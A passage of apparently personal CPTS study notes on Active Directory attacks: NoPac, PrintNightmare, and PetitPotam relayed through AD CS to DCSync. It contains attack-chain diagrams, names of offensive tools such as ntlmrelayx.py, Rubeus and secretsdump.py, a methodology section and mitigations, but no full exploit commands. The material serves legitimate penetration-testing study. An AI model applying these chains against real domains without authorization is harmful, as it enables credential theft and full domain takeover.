                        │
                        ↓
                  NTLM relay
                        │
                        ↓
                   AD CS
                        │
                        ↓
               DC certificate
                        │
            ┌───────────┴───────────┐
            ↓                       ↓
    gettgtpkinit.py               Rubeus
            ↓                       ↓
         DC TGT                   DC TGT
            ↓                       ↓
      getnthash.py                PTT
            ↓                       ↓
       DC NT hash             Windows context
            │                       │
            └───────────┬───────────┘
                        ↓
                     DCSync
                        ↓
               Domain credentials
```

> [!important] 🔥 The Key Insight  
> PetitPotam is not the final objective.
> 
> The powerful part is the **chain**:
> 
> **coercion → relay → certificate → TGT → DCSync**

---

# 3️⃣9️⃣ 🛡️ PetitPotam Mitigations

The source recommends first applying the patch for **CVE-2021-36942**.

It then gives additional hardening measures.

### Recommended Defensive Measures from the Source

#### 1. Extended Protection for Authentication

Use **Extended Protection for Authentication** to help prevent NTLM relay attacks.

#### 2. Require SSL

Require HTTPS for:

- Certificate Authority Web Enrollment
    
- Certificate Enrollment Web Service
    

This prevents relying on insecure HTTP connections for these services.

#### 3. Restrict NTLM on Domain Controllers

Disable/restrict NTLM authentication for Domain Controllers where appropriate.

#### 4. Restrict NTLM on AD CS

Disable NTLM on AD CS servers using Group Policy.

#### 5. Restrict NTLM in IIS

Disable NTLM for IIS on AD CS servers where:

- Certificate Authority Web Enrollment is used;
    
- Certificate Enrollment Web Service is used.
    

### Defensive Mental Model

```text
PetitPotam
    ↓
Forced NTLM authentication
    ↓
NTLM relay
    ↓
AD CS
```

Therefore defenses should not focus exclusively on PetitPotam.

You want to break **multiple links** in the chain:

```text
[Coercion] ──X──> [NTLM Relay] ──X──> [AD CS] ──X──> [Certificate] ──X──> [TGT]
```

The source explicitly notes that patching CVE-2021-36942 alone is not sufficient protection for many AD CS environments because other authenticated AD CS attack paths may remain.

---

# 4️⃣0️⃣ 🧭 Comparing the Three Attacks

|Feature|NoPac|PrintNightmare|PetitPotam|
|---|---|---|---|
|Main CVEs|42278 + 42287|34527 + 1675|36942|
|Main technology|SAM + Kerberos|Print Spooler|MS-EFSRPC / NTLM|
|Source starting point|Standard domain user|Standard domain credentials|Unauthenticated|
|Main primitive|`sAMAccountName` spoofing|Remote code execution|Authentication coercion|
|Important dependency|Machine Account Quota|Print protocols / vulnerable spooler|AD CS + NTLM relay path|
|Key artifact|Kerberos ticket / `.ccache`|DLL / Meterpreter session|DC certificate|
|Possible privilege|SYSTEM / privileged DC access|SYSTEM|DC identity / domain compromise|
|Main follow-on|DCSync|Post-exploitation|TGT → DCSync|

---

# 4️⃣1️⃣ 🧠 "What Should I Look For?" Decision Tree

```text
START
  │
  ↓
Do I have standard domain credentials?
  │
  ├── YES
  │    │
  │    ├── Check MachineAccountQuota
  │    │       │
  │    │       └── Potential NoPac path
  │    │
  │    └── Check Print Spooler / MS-RPRN / MS-PAR
  │            │
  │            └── Potential PrintNightmare path
  │
  └── NO
       │
       └── Is AD CS present?
               │
               ├── YES
               │     │
               │     └── Investigate authentication
               │         coercion + relay paths
               │
               └── NO
                     │
                     └── PetitPotam chain shown here
                         cannot proceed through
                         the demonstrated AD CS path
```

> [!warning] ⚠️ Important Source Boundary  
> The tree above reflects the attack paths demonstrated in this material. It should not be interpreted as an exhaustive AD vulnerability decision tree.

---

# 4️⃣2️⃣ 🔗 Credential / Ticket Flow Cheat Sheet

## NoPac

```text
Domain user
    ↓
Machine account
    ↓
sAMAccountName spoof
    ↓
Kerberos ticket
    ↓
Administrator impersonation
    ↓
SYSTEM / DC access
    ↓
DCSync
```

## PrintNightmare

```text
Domain credentials
    ↓
MS-RPRN / MS-PAR
    ↓
DLL payload
    ↓
SMB hosting
    ↓
PrintNightmare
    ↓
Meterpreter
    ↓
SYSTEM
```

## PetitPotam

```text
Unauthenticated
    ↓
PetitPotam
    ↓
DC authentication coercion
    ↓
NTLM relay
    ↓
AD CS
    ↓
DC certificate
    ↓
PKINIT
    ↓
DC TGT
    ↓
DCSync
```

---

# 4️⃣3️⃣ 🧠 Important Concepts to Keep Separate

## `sAMAccountName`

An AD account attribute involved in identifying the account.

NoPac abuses a situation where a computer account's name can temporarily be manipulated to match a Domain Controller's identity.

---

## `ms-DS-MachineAccountQuota`

Controls how many computer accounts a user can add to the domain.

Source example:

```text
10
```

Potentially restrictive configuration:

```text
0
```

For NoPac, this value directly affects whether the demonstrated machine-account creation stage can occur.

---

## TGT

A **Ticket-Granting Ticket** used by Kerberos to obtain service tickets.

In the PetitPotam chain:

```text
DC certificate
      ↓
PKINIT
      ↓
TGT
```

---

## `.ccache`

A Linux Kerberos credential cache.

Examples in this material:

```text
administrator_DC01.INLANEFREIGHT.local.ccache
dc01.ccache
```

Used with:

```bash
export KRB5CCNAME=dc01.ccache
```

---

## Certificate

In the PetitPotam chain, the certificate is not merely an informational artifact.

It becomes an authentication mechanism:

```text
DC certificate
      ↓
PKINIT
      ↓
DC TGT
```

---

## DCSync

DCSync uses AD replication mechanisms to retrieve account secrets from a Domain Controller.

The source demonstrates obtaining:

- NTLM hashes
    
- Kerberos keys
    
- `krbtgt` credentials
    

using tools such as:

```text
secretsdump.py
```

and:

```text
lsadump::dcsync
```

---

# 4️⃣4️⃣ 🧩 Why DCSync Appears at the End of Multiple Chains

Notice how different vulnerabilities can converge on the same final technique:

```text
NoPac ────────────────┐
                      │
PrintNightmare ───────┤
                      │
PetitPotam → AD CS ───┤
                      ↓
                 Privileged DC
                     Access
                      ↓
                    DCSync
                      ↓
               Domain Credentials
```

This is an important CPTS methodology concept:

> **The vulnerability is often only the first half of the attack.**

The real objective is to turn the initial primitive into a reusable authentication mechanism or privileged security context.

---

# 4️⃣5️⃣ 🧠 Assessment Methodology

When a new AD vulnerability appears, don't immediately memorize the exploit syntax.

Instead break it into five questions:

### 1. 🔎 What is my starting position?

```text
Unauthenticated?
Domain user?
Local administrator?
SYSTEM?
Domain administrator?
```

### 2. 🧩 What does the vulnerability give me?

```text
Identity confusion?
Code execution?
Authentication?
Certificate?
Ticket?
Hash?
SYSTEM?
```

### 3. 🔗 What can I chain it with?

```text
Kerberos
NTLM relay
AD CS
SMB
DCSync
Pass-the-ticket
```

### 4. 🎯 What is the highest-value resulting artifact?

```text
SYSTEM shell
DC TGT
NTLM hash
krbtgt hash
Administrator hash
Certificate
```

### 5. 🧪 How do I validate the result?

```text
whoami
klist
SMB authentication
DCSync output
Ticket presence
```

---

# 4️⃣6️⃣ 🧠 The "Primitive → Artifact → Access" Model

This entire section can be remembered using:

```text
             VULNERABILITY
                   ↓
              PRIMITIVE
                   ↓
               ARTIFACT
                   ↓
              AUTHENTICATION
                   ↓
                ACCESS
                   ↓
             DOMAIN CONTROL
```

### NoPac

```text
SAM/Kerberos flaw
       ↓
Kerberos ticket
       ↓
Administrator impersonation
       ↓
SYSTEM / DC
```

### PrintNightmare

```text
Print Spooler flaw
       ↓
DLL execution
       ↓
Meterpreter
       ↓
SYSTEM
```

### PetitPotam

```text
MS-EFSRPC flaw
       ↓
Forced NTLM authentication
       ↓
Certificate
       ↓
TGT
       ↓
DCSync
       ↓
Domain credentials
```

---

# 4️⃣7️⃣ ⚠️ Operational / OPSEC Considerations

The source repeatedly demonstrates why exploitation should not be viewed as a purely technical "run command → win" process.

Potential artifacts include:

- `.ccache` files;
    
- created computer accounts;
    
- temporary `sAMAccountName` changes;
    
- SMB services;
    
- temporary batch files;
    
- DLL payloads;
    
- Meterpreter sessions;
    
- certificates;
    
- Kerberos tickets;
    
- NTLM hashes;
    
- event/log activity;
    
- AV/EDR detections.
    

For example, the source explicitly warns that:

- NoPac can create `.ccache` files.
    
- `smbexec.py` can trigger Defender/EDR.
    
- PrintNightmare can affect the Print Spooler.
    
- The attacks should be performed cautiously in real engagements.
    

> [!important] 🧠 CPTS Rule  
> **Every exploit has both an offensive path and an operational footprint.**
> 
> Your methodology should therefore track:
> 
> ```text
> Initial access
>      ↓
> Exploitation
>      ↓
> Privilege
>      ↓
> Artifact
>      ↓
> Detection risk
>      ↓
> Cleanup / reporting
> ```

---

# 4️⃣8️⃣ 📌 Key Takeaways

> [!success] 🎯 Must-Know CPTS Concepts

### NoPac

- **NoPac = SamAccountName Spoofing / Sam_The_Admin**
    
- Combines **CVE-2021-42278** and **CVE-2021-42287**.
    
- Abuses computer-account `sAMAccountName` behavior.
    
- `ms-DS-MachineAccountQuota` is important.
    
- The source example shows the default value as `10`.
    
- Setting it to `0` prevents the demonstrated machine-account creation stage.
    
- NoPac can produce a privileged Kerberos ticket and a SYSTEM shell.
    
- The resulting `.ccache` can be used for further attacks.
    
- NoPac can also be used in the source's demonstrated DCSync path.
    

### PrintNightmare

- Associated with **CVE-2021-34527** and **CVE-2021-1675**.
    
- Targets the Windows **Print Spooler** service.
    
- `rpcdump.py` can be used to check for `MS-RPRN` and `MS-PAR`.
    
- The demonstrated attack creates a DLL payload.
    
- The DLL is hosted over SMB.
    
- Metasploit catches the reverse connection.
    
- Successful exploitation results in `NT AUTHORITY\SYSTEM`.
    
- `smbexec.py` and payload execution can trigger AV/EDR detections.
    

### PetitPotam

- Associated with **CVE-2021-36942**.
    
- Abuses **MS-EFSRPC** to coerce authentication.
    
- The demonstrated attack can start without domain authentication.
    
- The powerful chain is:
    

> ```text
> PetitPotam
>     ↓
> DC authentication
>     ↓
> NTLM relay
>     ↓
> AD CS
>     ↓
> DC certificate
>     ↓
> TGT
>     ↓
> DCSync
> ```

- `ntlmrelayx.py` handles the relay.
    
- `PetitPotam.py` triggers the authentication.
    
- `gettgtpkinit.py` converts the certificate into a TGT.
    
- `getnthash.py` can recover the DC machine-account NT hash using the demonstrated U2U/PAC route.
    
- `Rubeus` provides an alternative Windows route for certificate → TGT → PTT.
    
- `secretsdump.py` or Mimikatz can then perform DCSync.
    

---

# 4️⃣9️⃣ 🗺️ Final CPTS Mental Map

```text
╔══════════════════════════════════════════════════════════════════╗
║                  BLEEDING EDGE AD ATTACKS                       ║
╚══════════════════════════════════════════════════════════════════╝

                         FOOTHOLD
                            │
             ┌──────────────┼──────────────┐
             ↓              ↓              ↓
        DOMAIN USER     DOMAIN USER    UNAUTHENTICATED
             │              │              │
             ↓              ↓              ↓
          NoPac       PrintNightmare    PetitPotam
             │              │              │
             ↓              ↓              ↓
       SAM/Kerberos       Spooler       MS-EFSRPC
             │              │              │
             ↓              ↓              ↓
      Kerberos ticket     DLL/RCE       NTLM coercion
             │              │              │
             ↓              ↓              ↓
        DC access         SYSTEM       NTLM relay
                                           │
                                           ↓
                                         AD CS
                                           │
                                           ↓
                                      DC certificate
                                           │
                                           ↓
                                        PKINIT
                                           │
                                           ↓
                                         DC TGT
                                           │
                         ┌─────────────────┴──────────────┐
                         ↓                                ↓
                    Linux path                       Windows path
                         │                                │
                  gettgtpkinit.py                     Rubeus
                         │                                │
                         ↓                                ↓
                    getnthash.py                       PTT
                         │                                │
                         └────────────────┬───────────────┘
                                          ↓
                                       DCSync
                                          ↓
                                  Domain credentials
                                          ↓
                                    Domain compromise
```

> [!important] 🧠 Final Mental Model  
> The biggest lesson from this section is **chaining**.
> 
> ```text
> Vulnerability
>      ↓
> Primitive
>      ↓
> Credential / Ticket / Shell / Certificate
>      ↓
> Authentication
>      ↓
> Privileged access
>      ↓
> DCSync / further AD attacks
> ```
> 
> A vulnerability that initially appears to provide only authentication coercion, a Kerberos ticket, or code execution can become extremely powerful when combined with another AD feature.

---

# 5️⃣0️⃣ 📚 Source Recap

The source summarizes the section around three attacks:

1. **NoPac — SamAccountName Spoofing**
    
2. **PrintNightmare — Remote exploitation**
    
3. **PetitPotam — MS-EFSRPC**
    

The source emphasizes that the first two demonstrated paths use standard domain-user access, while the PetitPotam path is demonstrated from an unauthenticated position. It also emphasizes that AD attacks continually evolve and that the techniques shown are only a small glimpse of the broader AD CS attack surface.

> [!tip] 🧠 CPTS Takeaway  
> When you encounter a newly disclosed AD vulnerability, don't just memorize the exploit command.
> 
> Learn to identify:
> 
> **What access do I need? → What primitive does it provide? → What artifact do I obtain? → What authentication mechanism can I turn it into? → What privilege does that lead to?**
> 
> That is the reusable skill behind this entire section.